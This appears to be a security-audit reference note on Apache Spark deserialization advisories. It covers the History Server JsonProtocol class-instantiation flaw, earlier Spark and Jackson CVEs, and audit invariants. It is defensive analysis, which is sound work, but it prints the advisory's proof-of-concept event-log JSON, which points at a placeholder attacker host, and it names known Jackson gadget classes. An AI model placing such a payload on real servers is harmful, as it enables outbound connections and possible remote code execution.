# Apache Spark — Known Issues and Advisories (Deserialization-Focused)

## Sources

- Spark security advisory listing: https://spark.apache.org/security.html
- [REDACTED] (oss-sec announcement): https://seclists.org/oss-sec/2026/q1/310
- [REDACTED] (Tenable): https://www.tenable.com/cve/[REDACTED]
- [REDACTED] (Wiz): https://www.wiz.io/vulnerability-database/cve/[REDACTED]
- [REDACTED] (GitLab Advisory DB): https://advisories.gitlab.com/pkg/maven/org.apache.spark/spark-core_2.12/[REDACTED]/
- [REDACTED] (OffSeq): https://radar.offseq.com/threat/[REDACTED]-[REDACTED]-deserialization-of-untruste-513e22e5
- [REDACTED] Jira: https://issues.apache.org/jira/browse/[REDACTED]
- [REDACTED] fix PR (master): https://github.com/apache/spark[REDACTED]
- [REDACTED] backport PR (branch-4.0): https://github.com/apache/spark[REDACTED]
- [REDACTED] (NVD): https://nvd.nist.gov/vuln/detail/[REDACTED]
- [REDACTED] (NVD): https://nvd.nist.gov/vuln/detail/[REDACTED]
- [REDACTED] (Snyk): https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESPARK-31575
- jackson-databind [REDACTED] issue: https://github.com/FasterXML/jackson-databind/issues/1599
- Jackson [REDACTED] CVE Criteria (canonical): https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria

## Context

### [REDACTED] / [REDACTED] — the in-scope advisory

- **CWE.** [REDACTED] Deserialization of Untrusted Data.
- **Component.** `org.apache.spark:spark-core_2.12` and `org.apache.spark:spark-core_2.13` — specifically `core/src/main/scala/org/apache/spark/util/JsonProtocol.scala`.
- **Affected versions.** Apache Spark before 3.5.7 and Apache Spark 4.0.0 before 4.0.1.
- **Fixed versions.** 3.5.7, 4.0.1, master (which becomes 4.1.0).
- **Severity (ASF rating).** Low — predicated on the attacker already having write access to the event-log directory.
- **Bug class.** [REDACTED] where the deserialized class name comes from attacker-controlled JSON, and class instantiation runs before any type check.
- **Mechanism.** `JsonProtocol.sparkEventFromJson` fallback `case other =>` did `mapper.readValue(json.toString, Utils.classForName(other))`, where `other` is the JSON `"Event"` string. Jackson would construct an instance of *any* class on the History Server classpath.
- **Exploit path (PoC from the advisory).** Drop an event-log file into `spark.history.fs.logDirectory` whose first line is:
  ```json
  {
    "Event": "org.apache.hive.jdbc.HiveConnection",
    "uri": "jdbc:hive2://<attacker-host>:<port>/",
    "info": { "hive.metastore.uris": "thrift://<attacker-host>:<port>" }
  }
  ```
  When the History Server next polls and replays, Jackson constructs `HiveConnection`, whose constructor opens a JDBC connection to the attacker's host. From there, gadget-chain techniques can escalate to RCE depending on classpath.
- **Fix shape.** Guard with `if (classOf[SparkListenerEvent].[REDACTED])` before `mapper.readValue`; throw `SparkException` otherwise. No class instance is constructed on the rejection path.
- **Vulnerable parent SHA (per audit brief).** `7f9ca1b37e140303af0d70e2895d19314f812661`.
- **Credit.** Alexandre Pujol (Linagora).
- **Disclosed.** 2026-03-13 by Holden Karau on oss-sec.

### Prior Spark deserialization CVEs (context for the audit)

These are not in the immediate scope (different code paths) but they establish the "Spark has a deserialization history" pattern that the playbook should treat as a hot zone.

#### [REDACTED] — Launcher API unsafe Java deserialization

- **Affected.** Spark 1.6.0 through 2.1.1.
- **Component.** Spark Launcher API (`org.apache.spark.launcher`).
- **Mechanism.** The launcher API performs unsafe Java-native deserialization (`ObjectInputStream.readObject`) on data received over its socket. Applications launched programmatically via the launcher API were vulnerable to RCE by an attacker with access to any user account on the local machine.
- **Not affected.** `spark-submit` and `spark-shell` (they don't use the launcher socket the same way).
- **Fix.** Spark 2.2.0+.
- **CWE.** [REDACTED].

#### [REDACTED] — Standalone master REST API unsafe code execution

- **Affected.** All Spark versions where standalone mode is enabled without authentication.
- **Component.** Spark standalone resource manager (`org.apache.spark.deploy.master`).
- **Mechanism.** The standalone master's REST API accepts code-execution requests; if `spark.authenticate` is `false`, an unauthenticated attacker who can reach the master's port can submit arbitrary code to run on the cluster. This is closer to "unauthenticated RPC accepting arbitrary code" than a deserialization gadget, but it's in the same neighborhood and is cited alongside [REDACTED] in security tracker timelines.
- **Mitigation.** Enable `spark.authenticate=true` for standalone masters. The vendor classifies this as a configuration / hardening issue rather than a code fix.

#### Other Spark deserialization-adjacent CVEs to be aware of

- **[REDACTED]** — Spark standalone & Mesos REST submission server, similar to [REDACTED] (unauthenticated job submission).
- **[REDACTED]** — Spark RPC authentication shared-secret bypass (Spark < 2.4.6, < 3.0.0). Not a deserialization bug per se, but in the same threat-model neighborhood.
- **[REDACTED]** — `spark-submit` `doAs` command injection through the `groups.command` config. [REDACTED], not [REDACTED], but relevant to the "untrusted input reaches code execution" pattern.

These confirm that **Spark has been bitten multiple times by patterns where input or config reaches code execution without sufficient typing/authentication**. [REDACTED] is the History Server flavor of that recurring class.

### Jackson polymorphic-deserialization CVEs (root-cause context)

The [REDACTED] root cause is **structurally identical** to the long-running Jackson polymorphic-deserialization CVE family, even though Spark's `JsonProtocol` does the dispatch by hand rather than via Jackson's `@JsonTypeInfo(use = Id.CLASS)` annotation. The Jackson advisories to keep in mind:

- **[REDACTED].** Original Jackson polymorphic-deserialization RCE. jackson-databind before 2.6.7.1 / 2.7.9.1 / 2.8.9. With `enableDefaultTyping()` on, any class on the classpath could be instantiated via `@class`. Blacklisted gadgets initially: `org.apache.commons.collections.functors.InvokerTransformer`, `InstantiateTransformer`, the Spring `ClassPathXmlApplicationContext` family, JDK rowset implementations.
- **[REDACTED].** Bypass of [REDACTED]'s initial blacklist using `org.apache.commons.dbcp2.BasicDataSource`.
- **[REDACTED].** Bypass using `c3p0`'s `JndiRefForwardingDataSource`.
- **[REDACTED] / [REDACTED] / [REDACTED] / [REDACTED].** Further blacklist bypasses (slf4j, blaze-ds-opt, openjpa, axis2).
- **[REDACTED], [REDACTED], [REDACTED], [REDACTED], [REDACTED].** Continued blacklist expansion.
- The blacklist-only approach proved fundamentally inadequate; Jackson 2.10 introduced `PolymorphicTypeValidator` and the `activateDefaultTyping(PolymorphicTypeValidator, ...)` API to require allowlist-based hardening.

**Lesson for Spark's fix.** The [REDACTED] fix takes the right shape: instead of trying to enumerate "bad" classes, it restricts to an allowlist (subclasses of `SparkListenerEvent`). This is the validator approach, applied to a hand-rolled dispatcher. It is the correct shape.

### Severity calibration for the playbook

The ASF rated [REDACTED] **low** because exploit requires event-log directory write access. For QPB's purposes, severity is irrelevant — the audit invariant is "no caller-named class instantiation," and the playbook should flag any violation regardless of how restrictive the operator's FS permissions happen to be. The CVE rating is a deployment-policy variable; the invariant is a code-property variable.

## Invariants (advisory-derived)

- **INV-ADV-1.** Any class-name-from-JSON path in the History Server / event-log replay code is a CVE candidate by precedent; the playbook should flag such patterns even before a CVE issues.
- **INV-ADV-2.** "Blacklist bad classes" is not an acceptable mitigation in the Spark ecosystem. The Jackson CVE series demonstrates that blacklists are routinely bypassed. Allowlist by root-type (`[REDACTED](SparkListenerEvent)`) is the required shape.
- **INV-ADV-3.** Fixes that change error type from `ClassCastException` to `SparkException` are not just hygiene — they encode the security-relevant difference between "constructed then rejected" and "rejected before construction." The playbook should distinguish these.
